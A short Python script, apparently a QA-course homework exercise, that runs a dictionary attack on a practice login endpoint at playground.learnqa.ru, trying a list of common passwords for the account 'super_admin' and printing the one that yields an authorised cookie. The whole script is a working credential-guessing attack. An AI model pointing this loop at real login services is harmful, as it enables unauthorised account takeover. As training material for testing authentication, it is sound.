import requests


passwords = [
    "123456",
    "password",
    "123456789",
    "12345678",
    "qwerty",
    "abc123",
    "12345",
    "monkey",
    "letmein",
    "dragon",
    "111111",
    "1234567",
    "iloveyou",
    "trustno1",
    "baseball",
    "1234",
    "football",
    "1234567890",
    "sunshine",
    "princess",
    "adobe123",
    "123123",
    "welcome",
    "admin",
    "login",
    "666666",
    "solo",
    "master",
    "photoshop",
    "1qaz2wsx",
    "mustang",
    "access",
    "shadow",
    "ashley",
    "1q2w3e4r",
    "starwars",
    "121212",
    "passw0rd",
    "flower",
    "michael",
    "654321",
    "superman",
    "696969",
    "hottie",
    "qwertyuiop",
    "loveme",
    "azerty",
    "batman",
    "zaq1zaq1",
    "password1",
    "000000",
    "Football",
    "qazwsx",
    "ninja",
    "jesus",
    "hello",
    "freedom",
    "whatever",
    "donald",
    "123qwe",
    "charlie",
    "!@#$%^&*",
    "555555",
    "7777777",
    "888888",
    "aa123456",
    "lovely"
]


login = "super_admin"


for password in passwords:
    data = {"login": login,
            "password": password, }
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookies = response.cookies
    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text == "You are authorized":
        print(response2.text)
        print(f"Правильный пароль: {password}")
        break

